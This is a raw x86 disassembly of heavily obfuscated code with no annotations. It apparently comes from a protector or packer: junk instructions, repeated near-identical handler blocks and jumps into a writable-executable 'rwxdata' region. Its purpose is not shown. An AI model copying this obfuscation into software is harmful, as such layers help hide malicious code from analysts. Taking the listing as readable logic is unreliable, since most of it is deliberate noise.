call sub_1020e9c5
pushfd
mov [ esp ] eax
bt si di
rol si cl
xchg bp si
push ebx
movsx bx cl
bswap di
push 0xd9734d72
push [ rwxdata ]
pop [ esp ]
btr edi edi
xchg esi edi
stc
push 0x0
not bl
rcr si cl
rcr ebp 0x1
rcl bp 0xa
mov esi [ esp + 0x30 ]
mov di sp
call sub_1020dd7a
add al 0x22
and [ esi ] bl
add al 0x2
movsd [ edi ] [ esi ]
sbb eax 0x1b60a204
add al 0x2
jb rwxdata
cmc
stc
mov ax [ eax + edi ]
stc
stc
sub ebp 0x2
pushfd
mov [ ebp ] ax
pushad
pushad
push ebp
lea esp [ esp + 0x48 ]
jmp sub_1020f090
clc
stc
mov ax [ eax + edi ]
clc
sub ebp 0x2
jo rwxdata
xor eax 0xde259fb
clc
add ebx eax
clc
cmp ah 0x92
mov [ esp ] dl
sub ebp 0x4
push 0xdc85d3c2
mov [ ebp ] eax
mov [ esp + 0x4 ] cl
lea esp [ esp + 0x8 ]
jmp sub_1020f090
cmp bl [ ebx ]
add al 0x62

add al 0xc2
push edx
sbb al [ edx + eax ]
jb rwxdata
pushad
mov [ ebp ] ax
pushfd
push edi
pushfd
lea esp [ esp + 0x2c ]
jmp sub_1020f090
mov [ ebp ] ax
push esp
pushfd
pushfd
lea esp [ esp + 0xc ]
jmp sub_1020f090
add [ ebx ] ebx
add al 0xe2
push esp
sbb eax 0x1b98a204
add al 0xa2
add al 0x82
jno rwxdata
popad
sbb eax 0x1ba7e204
add al 0x62
sub bl [ esi ]
add al 0x62
xchg edi eax
sbb al [ edx + eax * 4 ]
pop ebp
sbb al [ edx ]
fstp [ esp + eax ]
retn 0x1da2
mov [ 0xffffffffa2041b98 ] al
add al 0xa2
in eax dx
sbb al 0x4
retn 0x1acd
sub_1020dd7a
push 0x3a7e193
ror esi 0x10
lea ebp [ ebx - 0x2f18a944 ]
pop ebp
dec esi
pushad
rol bp cl
xor esi 0xda89bbcd
or bh bl
bswap bp
lea ebp [ esp + 0x24 ]
shr bx cl
call sub_1020e472
jmp sub_1020d891
sub_1020ddbf
lea esi [ esi - 0x1 ]
lea esp [ esp + 0x28 ]
jo rwxdata
bts dx 0x5
sub bl al
call sub_1020e591
push 0xbedda183
mov [ ebp ] eax
mov [ esp + 0xc ] 0x21
lea esp [ esp + 0x28 ]
jmp rwxdata
rol dh cl
sub bl al
call sub_1020db7f
pushad
pushfd
cmp ebx 0xfe0
pushad
pushfd
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
lea esp [ esp + 0x48 ]
jne rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
not bh
movzx bx bl
call sub_1020d705
push 0x76e978f6
sub esp 0xffffffdc
jne rwxdata
clc
shl bl cl
bts bx si
xor [ ebp + 0xc ] 0x20
pushad
setbe bh
movsx bx dl
bswap bx
mov ebx [ esp + 0x20 ]
push ecx
push ebp
push [ esp ]
mov [ esp + 0x4 ] 0x2c
lea esp [ esp + 0x30 ]
jmp sub_1020f090
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
push 0xac4ba1f6
bswap eax
clc
add eax ebx
cmp bx bx
add eax 0xb2b3f12
cmc
bt sp ax
sub esi 0x4
stc
ror eax 0x1d
jmp rwxdata
bswap eax
cmp esp 0x7c3a5ea0
clc
cmp esi ecx
pushfd
add eax ebx
cmc
cmp ecx 0x33d02062
cmp sp 0xe560
push edi
add eax 0xb2b3f12
cmp bx 0x3eae
sub esi 0x4
call sub_1020ec86
call sub_1020e9c5
pushfd
mov [ esp ] eax
bt si di
rol si cl
xchg bp si
push ebx
movsx bx cl
bswap di
push 0xd9734d72
push [ rwxdata ]
pop [ esp ]
btr edi edi
xchg esi edi
stc
push 0x0
not bl
rcr si cl
rcr ebp 0x1
rcl bp 0xa
mov esi [ esp + 0x30 ]
mov di sp
call sub_1020dd7a
add al 0x22
and [ esi ] bl
add al 0x2
movsd [ edi ] [ esi ]
sbb eax 0x1b60a204
add al 0x2
jb rwxdata
xor eax 0xde259fb
clc
add ebx eax
clc
cmp ah 0x92
mov [ esp ] dl
sub ebp 0x4
push 0xdc85d3c2
mov [ ebp ] eax
mov [ esp + 0x4 ] cl
lea esp [ esp + 0x8 ]
jmp sub_1020f090
cmp bl [ ebx ]
add al 0x62

add al 0xc2
push edx
sbb al [ edx + eax ]
jb rwxdata
add [ ebx ] ebx
add al 0xe2
push esp
sbb eax 0x1b98a204
add al 0xa2
add al 0x82
jno rwxdata
popad
sbb eax 0x1ba7e204
add al 0x62
sub bl [ esi ]
add al 0x62
xchg edi eax
sbb al [ edx + eax * 4 ]
pop ebp
sbb al [ edx ]
fstp [ esp + eax ]
retn 0x1da2
mov [ 0xffffffffa2041b98 ] al
add al 0xa2
in eax dx
sbb al 0x4
retn 0x1acd
sub_1020e2ed
push [ esp + 0x4c ]
popfd
mov [ esp ] 0xbc
mov [ esp + 0x4 ] 0xdf
mov [ esp ] bl
lea esp [ esp + 0x50 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020e3b1
pushfd
pushfd
mov [ ebp + 0x4 ] edx
push 0x3d47250e
push edi
mov [ ebp + 0x8 ] eax
push 0xb8fd6aa5
pushfd
push ebx
pushfd
pop [ esp + 0x48 ]
pushfd
jmp rwxdata
jmp rwxdata
push [ esp + 0x4c ]
pop [ ebp ]
mov [ esp ] ch
lea esp [ esp + 0x50 ]
jmp sub_1020f090
sub_1020e400
add ebp 0x2
pushad
call sub_1020ec35
pushfd
bswap edx
movsx eax dl
bswap ax
mov edx [ ebp ]
pushfd
movsx ax al
lahf
movsx ax dl
mov eax [ ebp + 0x4 ]
jmp rwxdata
push ecx
pushfd
mov [ esp + 0x4 ] 0x95ef
idiv [ ebp + 0x8 ]
call sub_1020eddd
not al
jmp rwxdata
dec esi
shr dh cl
inc dh
add al 0xc1
not dl
dec dl
add bl al
rcl dh 0x1
shl dh cl
mov dx [ ebp ]
clc
add ebp 0x2
pushad
mov [ eax + edi ] dl
pushfd
mov [ esp ] 0x5b
push ebx
lea esp [ esp + 0x30 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020e472
ror bl cl
neg di
sub esp 0x98
shl al 0x2
adc al dl
xor di si
shl edi 0x1
mov edi esp
pushad
test dh bh
dec bl
jmp rwxdata
mov ebx esi
sbb al cl
bsr edx eax
add esi [ ebp ]
add esp 0x20
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020e4c4
call sub_1020e9a0
pushad
mov eax [ ebp ]
mov [ esp + 0x8 ] 0x228d
jmp rwxdata
mov eax [ eax ]
push 0xd600db7
call sub_1020f1f0
mov [ esp + 0x8 ] al
push [ esp + 0x28 ]
pop [ ebp ]
mov [ esp + 0xc ] bh
pushfd
push [ esp ]
lea esp [ esp + 0x34 ]
jmp sub_1020f090
sub_1020e516
push 0xe11e9f01
mov [ ebp + 0x4 ] eax
pushad
pushfd
pop [ esp + 0x28 ]
mov [ esp ] 0x4b
push edx
push 0x7e90c12c
push [ esp ]
push [ esp + 0x34 ]
pop [ ebp ]
push ecx
push 0x9d07cdcd
mov [ esp + 0x14 ] 0x7fca
push 0xb3061064
lea esp [ esp + 0x44 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020e55c
push [ esp ]
pushad
push [ esp + 0x8 ]
pushfd
pop [ esp + 0x34 ]
jmp rwxdata
push 0xf06098c3
push [ esp + 0x38 ]
pop [ ebp ]
mov [ esp ] bh
push [ esp ]
lea esp [ esp + 0x40 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020e56e
clc
lea esp [ esp + 0x4 ]
jno rwxdata
clc
and ebx 0xff0
jmp rwxdata
and ebx 0xff0
stc
jne rwxdata
pushad
pushfd
cmp ebx 0xfe0
pushad
pushfd
jmp rwxdata
clc
pushad
jmp rwxdata
cmp ebx 0xfe0
jmp rwxdata
lea esp [ esp + 0x48 ]
jne rwxdata
cmp ebx 0xfe0
pushfd
call sub_1020d690
shld eax edx cl
push 0xe722813d
mov [ esp + 0x4 ] dl
mov [ ebp + 0x4 ] eax
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
jne rwxdata
not bh
movzx bx bl
call sub_1020d705
push 0x76e978f6
sub esp 0xffffffdc
jne rwxdata
clc
shl bl cl
bts bx si
xor [ ebp + 0xc ] 0x20
pushad
setbe bh
movsx bx dl
bswap bx
mov ebx [ esp + 0x20 ]
push ecx
push ebp
push [ esp ]
mov [ esp + 0x4 ] 0x2c
lea esp [ esp + 0x30 ]
jmp sub_1020f090
pushfd
pop [ esp + 0x24 ]
pushfd
pushfd
mov [ esp ] dl
push [ esp + 0x2c ]
pop [ ebp ]
mov [ esp + 0x4 ] bh
lea esp [ esp + 0x30 ]
jmp rwxdata
pushad
sar bh 0x2
xor [ ebp + 0xc ] 0x20
lea esp [ esp + 0x20 ]
push 0xac4ba1f6
bswap eax
clc
add eax ebx
cmp bx bx
add eax 0xb2b3f12
cmc
bt sp ax
sub esi 0x4
stc
ror eax 0x1d
jmp rwxdata
bswap eax
cmp esp 0x7c3a5ea0
clc
cmp esi ecx
pushfd
add eax ebx
cmc
cmp ecx 0x33d02062
cmp sp 0xe560
push edi
add eax 0xb2b3f12
cmp bx 0x3eae
sub esi 0x4
call sub_1020ec86
call sub_1020e9c5
pushfd
mov [ esp ] eax
bt si di
rol si cl
xchg bp si
push ebx
movsx bx cl
bswap di
push 0xd9734d72
push [ rwxdata ]
pop [ esp ]
btr edi edi
xchg esi edi
stc
push 0x0
not bl
rcr si cl
rcr ebp 0x1
rcl bp 0xa
mov esi [ esp + 0x30 ]
mov di sp
call sub_1020dd7a
add al 0x22
and [ esi ] bl
add al 0x2
movsd [ edi ] [ esi ]
sbb eax 0x1b60a204
add al 0x2
jb rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
xor eax 0xde259fb
clc
add ebx eax
clc
cmp ah 0x92
mov [ esp ] dl
sub ebp 0x4
push 0xdc85d3c2
mov [ ebp ] eax
mov [ esp + 0x4 ] cl
lea esp [ esp + 0x8 ]
jmp sub_1020f090
cmp bl [ ebx ]
add al 0x62

add al 0xc2
push edx
sbb al [ edx + eax ]
jb rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
add [ ebx ] ebx
add al 0xe2
push esp
sbb eax 0x1b98a204
add al 0xa2
add al 0x82
jno rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
popad
sbb eax 0x1ba7e204
add al 0x62
sub bl [ esi ]
add al 0x62
xchg edi eax
sbb al [ edx + eax * 4 ]
pop ebp
sbb al [ edx ]
fstp [ esp + eax ]
retn 0x1da2
mov [ 0xffffffffa2041b98 ] al
add al 0xa2
in eax dx
sbb al 0x4
retn 0x1acd
sub_1020e591
setns dh
movzx eax al
pushad
mov edx [ eax * 4 + rwxdata ]
bt sp sp
rol edx 0x13
test bh ah
add edx 0x0
pushad
mov [ esp ] dx
mov [ esp + 0x40 ] edx
mov [ esp + 0x4 ] al
mov [ esp ] eax
push edi
push [ esp + 0x44 ]
retn 0x48
sub_1020e6b8
push [ esp + 0x10 ]
mov [ ebp + 0x4 ] dx
push eax
mov [ ebp + 0x6 ] ax
jmp rwxdata
call sub_1020e702
shl dh cl
sbb dl 0xee
shr dl 0x5
mov eax [ ebp ]
cmp ch 0x41
setpe dh
movzx dx bl
mov dx [ ebp + 0x4 ]
test dh 0x92
add ebp 0x6
pushad
push [ esp ]
mov [ eax ] dx
pushfd
mov [ esp + 0x4 ] bh
mov [ esp + 0xc ] 0x5b
push esp
lea esp [ esp + 0x2c ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020e6ca
push ecx
btr si bx
push 0x59f5add0
btr si dx
mov [ esp ] ebx
movzx dx cl
push edi
jmp rwxdata
pushfd
mov [ esp ] eax
bt si di
rol si cl
xchg bp si
push ebx
movsx bx cl
bswap di
push 0xd9734d72
push [ rwxdata ]
pop [ esp ]
btr edi edi
xchg esi edi
stc
push 0x0
not bl
rcr si cl
rcr ebp 0x1
rcl bp 0xa
mov esi [ esp + 0x30 ]
mov di sp
call sub_1020dd7a
add al 0x22
and [ esi ] bl
add al 0x2
movsd [ edi ] [ esi ]
sbb eax 0x1b60a204
add al 0x2
jb rwxdata
cmp bl [ ebx ]
add al 0x62

add al 0xc2
push edx
sbb al [ edx + eax ]
jb rwxdata
add [ ebx ] ebx
add al 0xe2
push esp
sbb eax 0x1b98a204
add al 0xa2
add al 0x82
jno rwxdata
popad
sbb eax 0x1ba7e204
add al 0x62
sub bl [ esi ]
add al 0x62
xchg edi eax
sbb al [ edx + eax * 4 ]
pop ebp
sbb al [ edx ]
fstp [ esp + eax ]
retn 0x1da2
mov [ 0xffffffffa2041b98 ] al
add al 0xa2
in eax dx
sbb al 0x4
retn 0x1acd
sub_1020e702
mov [ esp ] 0xa5
mov [ esp + 0x4 ] 0x5d
pushfd
pop [ esp + 0x3c ]
mov [ esp + 0x8 ] 0x2b
call sub_1020dabb
mov eax [ eax ]
push 0xd600db7
call sub_1020f1f0
mov [ esp + 0x8 ] al
push [ esp + 0x28 ]
pop [ ebp ]
mov [ esp + 0xc ] bh
pushfd
push [ esp ]
lea esp [ esp + 0x34 ]
jmp sub_1020f090
sub_1020e7cb
mov [ ss : eax ] dx
pushad
mov [ esp + 0x8 ] 0xfe
lea esp [ esp + 0x28 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020e861
mov esp eax
pushad
pushfd
pop [ esp + 0x1c ]
bswap di
mov [ esp + 0x18 ] esi
bswap edi
pushad
mov esi edx
lea edi [ esi + 0x4501885d ]
lea edi [ edx * 8 - 0x833b192 ]
jmp rwxdata
lea edi [ ecx + eax - 0x40 ]
push [ esp + 0xc ]
pushfd
mov [ esp + 0x3c ] edi
mov edi [ esp ]
std
bswap di
bswap di
mov edi eax
mov [ esp + 0x4 ] 0x2a
jmp rwxdata
cld
push 0x2d3807c7
push ebp
jmp sub_1020f266
sub_1020e898
call sub_1020da24
rcl dh cl
mov edx [ ebp ]
clc
not cl
btr ecx 0x1
dec ch
add ebp 0x4
bsf ecx ebp
btc ecx ecx
sub eax eax
or cx sp
mov ecx eax
call sub_1020d6e1
mov [ esp + 0x8 ] 0xb8
mov [ ebp ] ax
mov [ esp ] 0x2aae
mov [ esp + 0x4 ] 0x3ff0c1f2
push [ esp ]
push [ esp ]
lea esp [ esp + 0x18 ]
jmp sub_1020f090
sub_1020e8e6
push edi
pushfd
lea esp [ esp + 0x8 ]
ja rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
sub dh dl
mov edx esp
cwde
shrd ecx esp 0x13
shrd ecx ecx 0xb
lea ecx [ edi + 0x40 ]
lea eax [ ebp * 4 + 0x25a0af5c ]
jmp sub_1020dbe4
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020e923
pushad
mov al [ eax + edi ]
test cl al
pushfd
call sub_1020d434
rol si 0x6
shr si 0xa
test cl 0xa
dec si
mov esi [ ebp ]
bt sp 0x3
add ebp 0x4
push edi
lea esp [ esp + 0x4 ]
jmp rwxdata
pushad
test dh bh
dec bl
jmp rwxdata
mov ebx esi
sbb al cl
bsr edx eax
add esi [ ebp ]
add esp 0x20
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020e9a8
clc
sub ebp 0x4
mov [ esp ] cl
pushfd
jmp rwxdata
mov [ esp + 0x14 ] bh
mov [ ebp ] eax
mov [ esp + 0x4 ] 0x72
pushfd
push 0x6a4f07d3
mov [ esp ] bx
lea esp [ esp + 0x40 ]
jmp sub_1020f090
sub_1020e9de
mov [ ss : eax ] dx
pushfd
mov [ esp ] 0x45
pushfd
mov [ esp ] ch
lea esp [ esp + 0x18 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020ec35
pushad
mov [ esp + 0x4 ] dl
mov ax [ eax ]
jmp rwxdata
pushfd
mov [ ebp ] ax
mov [ esp ] bp
lea esp [ esp + 0x48 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020ec86
cmc
pushad
ror eax 0x1d
cmp ax ax
cmc
xor eax 0xde259fb
call sub_1020d787
mov [ ebp ] ax
mov [ esp + 0x4 ] si
mov [ esp ] 0xc7a8
mov [ esp ] di
lea esp [ esp + 0x50 ]
jmp sub_1020f090
sub_1020ee77
push 0xfa5c9ca6
pushad
pushfd
push [ ebp ]
pop [ esp + 0x24 ]
mov [ esp ] dl
stc
cmc
add ebp 0x4
cld
bt bp cx
stc
push [ esp + 0x24 ]
popfd
pushfd
push 0x1ddf60e7
lea esp [ esp + 0x30 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020ef9e
mov [ eax + edi ] dx
pushfd
jmp rwxdata
lea esi [ esi - 0x1 ]
push 0xa93d52d4
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020f013
mov dx [ ebp ]
pushad
jmp rwxdata
pushfd
bt edx 0x6
add ebp 0x2
pushfd
call sub_1020ef9e
mov dx [ ebp + 0x4 ]
push edi
pushfd
